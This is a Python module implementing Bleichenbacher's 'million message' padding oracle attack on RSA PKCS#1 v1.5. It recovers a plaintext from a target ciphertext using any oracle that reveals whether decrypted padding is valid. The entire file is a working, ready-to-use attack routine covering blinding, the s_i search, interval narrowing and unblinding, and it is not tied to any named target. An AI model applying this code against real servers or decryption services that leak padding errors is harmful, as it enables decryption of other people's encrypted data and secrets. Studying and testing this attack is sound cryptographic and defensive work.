"""Bleichenbacher's PKCS#1 v1.5 Padding Oracle Attack on RSA (Million Message Attack).

Recovers RSA plaintext given a padding oracle function:
oracle(c: int) -> bool (returns True if decrypted ciphertext satisfies PKCS#1 v1.5 padding).
"""

from __future__ import annotations

from typing import Callable


def ceil_div(a: int, b: int) -> int:
    return (a + b - 1) // b


def floor_div(a: int, b: int) -> int:
    return a // b


def bleichenbacher_attack(
    c: int,
    e: int,
    n: int,
    oracle: Callable[[int], bool],
    k_bytes: int | None = None,
    max_queries: int = 100000,
) -> int:
    """Executes Bleichenbacher's chosen-ciphertext attack to recover plaintext m.

    Args:
        c: Ciphertext to decrypt.
        e: Public exponent.
        n: RSA modulus.
        oracle: Function returning True if candidate ciphertext has valid PKCS#1 v1.5 padding.
        k_bytes: Modulus byte length (defaults to ceil(n.bit_length() / 8)).
        max_queries: Safety cap on oracle queries to prevent runaway execution.

    Returns:
        The recovered integer plaintext m (PKCS#1 v1.5 encoded).
    """
    if k_bytes is None:
        k_bytes = (n.bit_length() + 7) // 8

    B = 2 ** (8 * (k_bytes - 2))
    two_B = 2 * B
    three_B = 3 * B

    queries = 0

    def query(ciphertext: int) -> bool:
        nonlocal queries
        queries += 1
        if queries > max_queries:
            raise RuntimeError(f"Bleichenbacher query limit reached ({max_queries})")
        return oracle(ciphertext % n)

    # Step 1: Blinding (ensure original c is conforming)
    c0 = c
    s0 = 1
    if not query(c0):
        while True:
            s0 += 1
            c_test = (c * pow(s0, e, n)) % n
            if query(c_test):
                c0 = c_test
                break

    M = [(two_B, three_B - 1)]
    i = 1
    s_prev = 0

    while True:
        # Step 2: Searching for s_i
        if i == 1:
            # Step 2.a: Starting the search
            s = ceil_div(n, three_B)
            while True:
                c_try = (c0 * pow(s, e, n)) % n
                if query(c_try):
                    break
                s += 1
        elif len(M) >= 2:
            # Step 2.b: Searching with more than one interval
            s = s_prev + 1
            while True:
                c_try = (c0 * pow(s, e, n)) % n
                if query(c_try):
                    break
                s += 1
        else:
            # Step 2.c: Searching with one interval [a, b]
            a, b = M[0]
            r = ceil_div(2 * (b * s_prev - two_B), n)
            found = False
            while not found:
                s_lo = ceil_div(two_B + r * n, b)
                s_hi = floor_div(three_B - 1 + r * n, a)
                for s in range(s_lo, s_hi + 1):
                    c_try = (c0 * pow(s, e, n)) % n
                    if query(c_try):
                        found = True
                        break
                r += 1

        # Step 3: Narrowing the set of intervals
        new_M: list[tuple[int, int]] = []
        for a, b in M:
            r_lo = ceil_div(a * s - three_B + 1, n)
            r_hi = floor_div(b * s - two_B, n)
            for r in range(r_lo, r_hi + 1):
                new_a = max(a, ceil_div(two_B + r * n, s))
                new_b = min(b, floor_div(three_B - 1 + r * n, s))
                if new_a <= new_b:
                    new_M.append((new_a, new_b))

        # Merge overlapping intervals
        new_M.sort()
        merged_M: list[tuple[int, int]] = []
        for interval in new_M:
            if not merged_M or merged_M[-1][1] < interval[0]:
                merged_M.append(interval)
            else:
                merged_M[-1] = (merged_M[-1][0], max(merged_M[-1][1], interval[1]))
        M = merged_M

        # Step 4: Check termination
        if len(M) == 1 and M[0][0] == M[0][1]:
            m0 = M[0][0]
            # Unblind: m = (m0 * s0^-1) mod n
            inv_s0 = pow(s0, -1, n)
            return (m0 * inv_s0) % n

        s_prev = s
        i += 1
